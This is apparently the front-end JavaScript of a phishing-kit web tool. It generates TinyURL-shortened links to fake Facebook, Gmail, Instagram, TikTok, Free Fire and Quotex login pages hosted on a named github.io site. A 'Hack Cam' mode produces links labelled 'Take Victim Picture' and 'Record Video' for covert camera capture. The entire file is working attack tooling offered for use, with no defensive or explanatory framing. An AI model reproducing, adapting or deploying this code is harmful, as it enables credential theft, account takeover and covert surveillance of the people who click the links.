const urlParams = new URLSearchParams(window.location.search);
const account = urlParams.get('account');
const tools = urlParams.get('tools');
const chatId = urlParams.get('id');
const resultDiv = document.getElementById('result');
const input = document.getElementById('input-text');

if (account === 'facebook') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Facebook Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Facebook Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'gmail') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Gmail Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Gmail Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'instagram') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Instagram Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Instagram Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'tiktok') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Tiktok Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Tiktok Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'freefire') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Free Fire Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Free Fire Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'twitter') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Twitter Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Twitter Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (account === 'quotex') {
  input.style.display = 'none';
  input.required = false;
  document.title = "Quotex Phishing Link Generator";
  document.getElementById("hi-text").textContent = "Quotex Phishing Link Generator";
  document.getElementById("submit-button").textContent = "Generate";
} else if (tools === 'camara') {
  input.required = true;
  document.title = "Hack Cam Pic & Video";
  document.getElementById("input-text").placeholder = "Enter the redirect URL";
  document.getElementById("hi-text").textContent = "📷Hack Cam Pic & Video📷";
  document.getElementById("submit-button").textContent = "Generate";
}

async function fetchInfo(event) {
  event.preventDefault();
  
  if (account === 'facebook') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/facebook.html?id=' + chatId;
    const phishingLinkText = "Facebook";
    urlshorter(phishingLinkText, urlInput);
  } else if (account === 'gmail') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/google.html?id=' + chatId;
    const phishingLinkText = "Gmail";
    urlshorter(phishingLinkText, urlInput);
  } else if (account === 'instagram') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/instagram.html?id=' + chatId;
    const phishingLinkText = "Instagram";
    urlshorter(phishingLinkText, urlInput);
  } else if (account === 'tiktok') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/tiktok.html?id=' + chatId;
    const phishingLinkText = "Tiktok";
    urlshorter(phishingLinkText, urlInput);
  } else if (account === 'freefire') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/freefire.html?id=' + chatId;
    const phishingLinkText = "Free Fire";
    urlshorter(phishingLinkText, urlInput);
  } else if (account === 'twitter') {
    resultDiv.textContent = "🚧 Twitter Phishing Link Coming Soon...";
    resultDiv.className = 'message success';
    resultDiv.style.display = 'block';
  } else if (account === 'quotex') {
    const urlInput = 'https://md-fahim-sarker.github.io/Service-Tools/account/quotex.html?id=' + chatId;
    const phishingLinkText = "Quotex";
    urlshorter(phishingLinkText, urlInput);
  } else if (tools === 'camara') {
    const url = document.getElementById('input-text').value; // Replace with the actual URL
    const photourl = 'https://md-fahim-sarker.github.io/Service-Tools/wait/p-index.html?id=' + chatId + '&url=' + url;
    const videourl = 'https://md-fahim-sarker.github.io/Service-Tools/wait/v-index.html?id=' + chatId + '&url=' + url;

    // Function to shorten URL using TinyURL API
    function shortenUrl(url) {
        const apiUrl = 'https://tinyurl.com/api-create.php?url=' + encodeURIComponent(url);
        return fetch(apiUrl).then(response => response.text());
    }

    // Shorten both URLs
    Promise.all([shortenUrl(photourl), shortenUrl(videourl)])
        .then(shortenedUrls => {
            const shortenedPhotourl = shortenedUrls[0];
            const shortenedVideourl = shortenedUrls[1];
            
            const resultMessage = `
  Your Camera Tracker Links Below:<br><br>
  📷 Take Victim Picture: <a href="${shortenedPhotourl}">${shortenedPhotourl}</a><br><br>
  🎥 Record Video: <a href="${shortenedVideourl}">${shortenedVideourl}</a><br><br>
`;

            resultDiv.innerHTML = resultMessage;
            resultDiv.className = 'message success';
            resultDiv.style.display = 'block';
        })
        .catch(error => {
            console.error('Error shortening URLs:', error);
            displayError("Failed to shorten the URL.");
        });
}

}






function urlshorter(phishingLinkText, urlInput) {
  
  if (urlInput) {
    shortenUrl(urlInput, phishingLinkText);
  }
}

function shortenUrl(urlInput, phishingLinkText) {
  const apiUrl = 'https://tinyurl.com/api-create.php?url=' + encodeURIComponent(urlInput);

  fetch(apiUrl)
    .then(response => response.text())
    .then(shortenedUrl => {
     const resultMessage = `
           🔗Your ${phishingLinkText} Phishing Link: <a href="${shortenedUrl}">${shortenedUrl}</a><br><br>
`;
      resultDiv.innerHTML = resultMessage;
      resultDiv.className = 'message success';
      resultDiv.style.display = 'block';
    })
    .catch(error => {
      console.error('Error shortening URL:', error);
      displayError("Failed to shorten the URL.");
    });
}

function backtoindex() {
  window.history.back();
}